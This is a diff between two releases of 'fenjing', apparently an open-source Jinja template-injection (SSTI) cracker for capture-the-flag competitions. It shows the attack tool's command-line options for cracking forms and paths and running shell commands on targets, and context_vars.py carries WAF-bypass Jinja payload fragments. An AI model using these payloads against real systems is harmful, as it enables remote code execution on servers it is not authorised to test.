# Comparing `tmp/fenjing-0.4.8.tar.gz` & `tmp/fenjing-0.4.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.4.8.tar", last modified: Mon Jul 17 16:56:37 2023, max compression
+gzip compressed data, was "fenjing-0.4.9.tar", last modified: Wed Jul 26 15:23:03 2023, max compression
```

## Comparing `fenjing-0.4.8.tar` & `fenjing-0.4.9.tar`

### file list

```diff
@@ -1,39 +1,39 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 16:56:37.666393 fenjing-0.4.8/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-17 16:56:26.000000 fenjing-0.4.8/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-17 16:56:26.000000 fenjing-0.4.8/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     9453 2023-07-17 16:56:37.666393 fenjing-0.4.8/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     9016 2023-07-17 16:56:26.000000 fenjing-0.4.8/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-17 16:56:26.000000 fenjing-0.4.8/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 16:56:37.666393 fenjing-0.4.8/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)    13626 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     2280 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     2913 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/cracker.py
--rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/form.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7701 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    33353 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     2084 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/shell_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     4720 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/submitter.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 16:56:37.666393 fenjing-0.4.8/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     5003 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    10297 2023-07-17 16:56:26.000000 fenjing-0.4.8/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 16:56:37.666393 fenjing-0.4.8/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     9453 2023-07-17 16:56:37.000000 fenjing-0.4.8/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-17 16:56:37.000000 fenjing-0.4.8/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-17 16:56:37.000000 fenjing-0.4.8/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-17 16:56:37.000000 fenjing-0.4.8/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-17 16:56:37.000000 fenjing-0.4.8/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-17 16:56:26.000000 fenjing-0.4.8/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-17 16:56:37.666393 fenjing-0.4.8/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-17 16:56:26.000000 fenjing-0.4.8/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 16:56:37.666393 fenjing-0.4.8/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     2571 2023-07-17 16:56:26.000000 fenjing-0.4.8/tests/test_cracker.py
--rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-17 16:56:26.000000 fenjing-0.4.8/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-17 16:56:26.000000 fenjing-0.4.8/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:23:03.436479 fenjing-0.4.9/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-26 15:22:53.000000 fenjing-0.4.9/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-26 15:22:53.000000 fenjing-0.4.9/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     9660 2023-07-26 15:23:03.436479 fenjing-0.4.9/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     9223 2023-07-26 15:22:53.000000 fenjing-0.4.9/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-26 15:22:53.000000 fenjing-0.4.9/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:23:03.432479 fenjing-0.4.9/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)    13707 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2280 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3434 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2913 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/form.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7701 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    34703 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2206 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/shell_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4720 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/submitter.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:23:03.436479 fenjing-0.4.9/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     5003 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10297 2023-07-26 15:22:53.000000 fenjing-0.4.9/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:23:03.436479 fenjing-0.4.9/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     9660 2023-07-26 15:23:03.000000 fenjing-0.4.9/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-26 15:23:03.000000 fenjing-0.4.9/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-26 15:23:03.000000 fenjing-0.4.9/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 15:23:03.000000 fenjing-0.4.9/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-26 15:23:03.000000 fenjing-0.4.9/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 15:22:53.000000 fenjing-0.4.9/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-26 15:23:03.436479 fenjing-0.4.9/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-26 15:22:53.000000 fenjing-0.4.9/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:23:03.436479 fenjing-0.4.9/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     2571 2023-07-26 15:22:53.000000 fenjing-0.4.9/tests/test_cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-26 15:22:53.000000 fenjing-0.4.9/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-26 15:22:53.000000 fenjing-0.4.9/tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.8/LICENSE` & `fenjing-0.4.9/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/PKG-INFO` & `fenjing-0.4.9/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.8
+Version: 0.4.9
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -83,19 +83,19 @@
 
 支持绕过0-9的同时绕过加号或减号
 
 支持全角数字和特定数字相加减两种绕过方式
 
 ### `'%c'`绕过:
 
-支持绕过引号，`g`和`lipsum`
+支持绕过引号，`g`，`lipsum`和`urlencode`
 
 ### 下划线绕过：
 
-支持`(lipsum|escape|batch(22)|list|first|last)`
+支持`(lipsum|escape|batch(22)|list|first|last)`等
 - 其中的数字22支持上面的数字绕过
 
 ### 任意字符串：
 
 支持绕过引号，任意字符串拼接符号，下划线和任意关键词
 
 支持以下形式
@@ -180,14 +180,15 @@
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   检测模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 Usage: python -m fenjing crack [OPTIONS]
 
   攻击指定的表单
 
@@ -198,14 +199,15 @@
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 Usage: python -m fenjing get-config [OPTIONS]
 
   攻击指定的表单，并获得目标服务器的flask config
 
@@ -215,29 +217,31 @@
   -m, --method TEXT   form的提交方式，默认为POST
   -i, --inputs TEXT   form的参数，以逗号分隔
   --interval FLOAT    每次请求的间隔
   --detect-mode TEXT  分析模式，可为accurate或fast
   --user-agent TEXT   请求时使用的User Agent
   --header TEXT       请求时使用的Headers
   --cookies TEXT      请求时使用的Cookie
-  --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
+  --proxy TEXT        请求时使用的代理
+  --tamper-cmd TEXT   在发送payload之前进行编码的命令，默认不进行额外操作
   --help              Show this message and exit.
 
 Usage: python -m fenjing crack-path [OPTIONS]
 
   攻击指定的路径
 
 Options:
   -u, --url TEXT       需要攻击的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 ```
 
 ### 作为python库使用
```

### Comparing `fenjing-0.4.8/README.md` & `fenjing-0.4.9/README.md`

 * *Files 3% similar despite different names*

```diff
@@ -70,19 +70,19 @@
 
 支持绕过0-9的同时绕过加号或减号
 
 支持全角数字和特定数字相加减两种绕过方式
 
 ### `'%c'`绕过:
 
-支持绕过引号，`g`和`lipsum`
+支持绕过引号，`g`，`lipsum`和`urlencode`
 
 ### 下划线绕过：
 
-支持`(lipsum|escape|batch(22)|list|first|last)`
+支持`(lipsum|escape|batch(22)|list|first|last)`等
 - 其中的数字22支持上面的数字绕过
 
 ### 任意字符串：
 
 支持绕过引号，任意字符串拼接符号，下划线和任意关键词
 
 支持以下形式
@@ -167,14 +167,15 @@
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   检测模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 Usage: python -m fenjing crack [OPTIONS]
 
   攻击指定的表单
 
@@ -185,14 +186,15 @@
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 Usage: python -m fenjing get-config [OPTIONS]
 
   攻击指定的表单，并获得目标服务器的flask config
 
@@ -202,29 +204,31 @@
   -m, --method TEXT   form的提交方式，默认为POST
   -i, --inputs TEXT   form的参数，以逗号分隔
   --interval FLOAT    每次请求的间隔
   --detect-mode TEXT  分析模式，可为accurate或fast
   --user-agent TEXT   请求时使用的User Agent
   --header TEXT       请求时使用的Headers
   --cookies TEXT      请求时使用的Cookie
-  --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
+  --proxy TEXT        请求时使用的代理
+  --tamper-cmd TEXT   在发送payload之前进行编码的命令，默认不进行额外操作
   --help              Show this message and exit.
 
 Usage: python -m fenjing crack-path [OPTIONS]
 
   攻击指定的路径
 
 Options:
   -u, --url TEXT       需要攻击的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 ```
 
 ### 作为python库使用
```

### Comparing `fenjing-0.4.8/fenjing/cli.py` & `fenjing-0.4.9/fenjing/cli.py`

 * *Files 4% similar despite different names*

```diff
@@ -63,16 +63,15 @@
     payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
     if payload is None:
         logger.warning("%s generating payload.", colored("red", "Failed"))
         return ""
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
         payload_wont_print = (
-            "Payload generator says that this "
-            + "payload %s command execution result."
+            "Payload generator says that this " + "payload %s command execution result."
         )
         logger.warning(payload_wont_print, colored("red", "won't print"))
     result = submitter.submit(payload)
     assert result is not None
     return result.text
 
 
@@ -90,17 +89,15 @@
             break
         except KeyboardInterrupt:
             break
         result = cmd_exec_func(cmd)
         print(result)
 
 
-def parse_headers_cookies(
-    headers_list: List[str], cookies: str
-) -> Dict[str, str]:
+def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
     headers = {}
     if headers_list:
         for header in headers_list:
             k, _, v = header.partition(": ")
             if not k or not v:
                 logger.warning(f"Failed parsing {repr(header)}, ignored.")
                 continue
@@ -123,84 +120,73 @@
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
-@click.option(
-    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
-)
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
-@click.option(
-    "--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作"
-)
+@click.option("--proxy", default="", help="请求时使用的代理")
+@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
 def get_config(
     url: str,
     action: str,
     method: str,
     inputs: str,
     interval: float,
     detect_mode: str,
     user_agent: str,
     header: tuple,
     cookies: str,
+    proxy: str,
     tamper_cmd: str,
 ):
     """
     攻击指定的表单，并获得目标服务器的flask config
     """
     print(TITLE)
-    assert all(
-        param is not None for param in [url, inputs]
-    ), "Please check your param"
+    assert all(param is not None for param in [url, inputs]), "Please check your param"
     form = get_form(
         action=action or urlparse(url).path,
         method=method,
         inputs=inputs.split(","),
     )
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
-        headers=parse_headers_cookies(
-            headers_list=list(header), cookies=cookies
-        ),
+        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
+        proxy=proxy,
     )
     tamperer = None
     if tamper_cmd:
         tamperer = shell_tamperer(tamper_cmd)
     found, submitter, full_payload_gen = False, None, None
     for input_field in form["inputs"]:
         submitter = FormSubmitter(url, form, input_field, requester)
         if tamperer:
             submitter.add_tamperer(tamperer)
         cracker = Cracker(submitter, detect_mode=detect_mode)
         if not cracker.has_respond():
-            logger.info(
-                "Test input field %s failed, continue...", input_field
-            )
+            logger.info("Test input field %s failed, continue...", input_field)
             continue
         full_payload_gen = cracker.crack()
         if not full_payload_gen:
-            logger.info(
-                "Test input field %s failed, continue...", input_field
-            )
+            logger.info("Test input field %s failed, continue...", input_field)
             continue
         found = True
     if not found:
         logger.warning("Test form failed...")
         return
     assert submitter is not None and full_payload_gen is not None
 
     payload, will_print = full_payload_gen.generate(CONFIG)
     if not payload:
-        logger.error(
-            "The generator %s generating payload", colored("red", "failed")
-        )
+        logger.error("The generator %s generating payload", colored("red", "failed"))
         return
     if not will_print:
         logger.error(
             "The generated payload %s respond config.",
             colored("red", "won't"),
         )
         return
@@ -210,80 +196,69 @@
 
 
 @main.command()
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
-@click.option(
-    "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
-)
+@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
-@click.option(
-    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
-)
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
-@click.option(
-    "--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作"
-)
+@click.option("--proxy", default="", help="请求时使用的代理")
+@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
 def crack(
     url: str,
     action: str,
     method: str,
     inputs: str,
     exec_cmd: str,
     interval: float,
     detect_mode: str,
     user_agent: str,
     header: tuple,
     cookies: str,
+    proxy: str,
     tamper_cmd: str,
 ):
     """
     攻击指定的表单
     """
     print(TITLE)
-    assert all(
-        param is not None for param in [url, inputs]
-    ), "Please check your param"
+    assert all(param is not None for param in [url, inputs]), "Please check your param"
     form = get_form(
         action=action or urlparse(url).path,
         method=method,
         inputs=inputs.split(","),
     )
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
-        headers=parse_headers_cookies(
-            headers_list=list(header), cookies=cookies
-        ),
+        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
+        proxy=proxy,
     )
     tamperer = None
     if tamper_cmd:
         tamperer = shell_tamperer(tamper_cmd)
     found, submitter, full_payload_gen = False, None, None
     for input_field in form["inputs"]:
         submitter = FormSubmitter(url, form, input_field, requester)
         if tamperer:
             submitter.add_tamperer(tamperer)
         cracker = Cracker(submitter, detect_mode=detect_mode)
         if not cracker.has_respond():
-            logger.info(
-                "Test input field %s failed, continue...", input_field
-            )
+            logger.info("Test input field %s failed, continue...", input_field)
             continue
         full_payload_gen = cracker.crack()
         if not full_payload_gen:
-            logger.info(
-                "Test input field %s failed, continue...", input_field
-            )
+            logger.info("Test input field %s failed, continue...", input_field)
             continue
         found = True
     if not found:
         logger.warning("Test form failed...")
         return
     assert submitter is not None and full_payload_gen is not None
     cmd_exec_func = partial(
@@ -296,50 +271,45 @@
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
 
 
 @main.command()
 @click.option("--url", "-u", help="需要攻击的URL")
-@click.option(
-    "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
-)
+@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
-@click.option(
-    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
-)
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
-@click.option(
-    "--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作"
-)
+@click.option("--proxy", default="", help="请求时使用的代理")
+@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
 def crack_path(
     url: str,
     exec_cmd: str,
     interval: float,
     detect_mode: str,
     user_agent: str,
     header: tuple,
     cookies: str,
+    proxy: str,
     tamper_cmd: str,
 ):
     """
     攻击指定的路径
     """
     assert url is not None, "Please provide URL!"
     print(TITLE)
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
-        headers=parse_headers_cookies(
-            headers_list=list(header), cookies=cookies
-        ),
+        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
+        proxy=proxy,
     )
     submitter = PathSubmitter(url=url, requester=requester)
     if tamper_cmd:
         tamperer = shell_tamperer(tamper_cmd)
         submitter.add_tamperer(tamperer)
     cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
     full_payload_gen = cracker.crack()
@@ -361,42 +331,39 @@
 @main.command()
 @click.option("--url", "-u", help="需要扫描的URL")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="检测模式，可为accurate或fast"
 )
-@click.option(
-    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
-)
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
-@click.option(
-    "--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作"
-)
+@click.option("--proxy", default="", help="请求时使用的代理")
+@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
 def scan(
     url,
     exec_cmd,
     interval,
     detect_mode,
     user_agent,
     header,
     cookies,
+    proxy,
     tamper_cmd: str,
 ):
     """
     扫描指定的网站
     """
     print(TITLE)
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
-        headers=parse_headers_cookies(
-            headers_list=list(header), cookies=cookies
-        ),
+        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
+        proxy=proxy,
     )
     url_forms = (
         (page_url, form)
         for (page_url, forms) in yield_form(requester, url)
         for form in forms
     )
     tamperer = None
@@ -423,17 +390,15 @@
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
 
 
 @main.command()
-@click.option(
-    "--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1"
-)
+@click.option("--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1")
 @click.option("--port", "-p", default=11451, help="需要监听的端口, 默认为11451")
 def webui(host, port):
     """
     启动webui
     """
     webui_main(host, port)
```

### Comparing `fenjing-0.4.8/fenjing/colorize.py` & `fenjing-0.4.9/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/config_payload.py` & `fenjing-0.4.9/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/const.py` & `fenjing-0.4.9/fenjing/const.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/context_vars.py` & `fenjing-0.4.9/fenjing/context_vars.py`

 * *Files 2% similar despite different names*

```diff
@@ -49,18 +49,20 @@
     "{%set ab=namespace|escape|count%}": {"ab": 46},
     "{%set zb={}|escape|list|escape|count%}": {"zb": 26},
     "{%set t=joiner|urlencode|wordcount%}": {"t": 7},
     "{%set b={}|escape|urlencode|count%}": {"b": 6},
     "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
     "{%set l={}|escape|first|count%}": {"l": 1},
     "{%set un=((({}|select()|trim|list)[24]))%}": {"un": "_"},
-    "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2+"
+    "{%set unn=(lipsum|escape|batch(22)|list|first|last)%}": {"unn": "_"},
+    "{%set perc=(lipsum()|urlencode|first)%}": {"perc": "%"},
+    "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
     + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
     + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
-    + ")[24]))*2][dict(chr=x)|join](37))%}": {"perc": "%"},
+    + ")[24]))*2][dict(chr=x)|join](37))%}": {"percc": "%"},
 }
 
 
 def filter_by_waf(
     context_payloads: ContextPayloads, waf: Callable[[str], bool]
 ) -> ContextPayloads:
     """根据WAF函数去除所有不能通过WAF的payload
```

### Comparing `fenjing-0.4.8/fenjing/cracker.py` & `fenjing-0.4.9/fenjing/cracker.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/form.py` & `fenjing-0.4.9/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/full_payload_gen.py` & `fenjing-0.4.9/fenjing/full_payload_gen.py`

 * *Files identical despite different names*

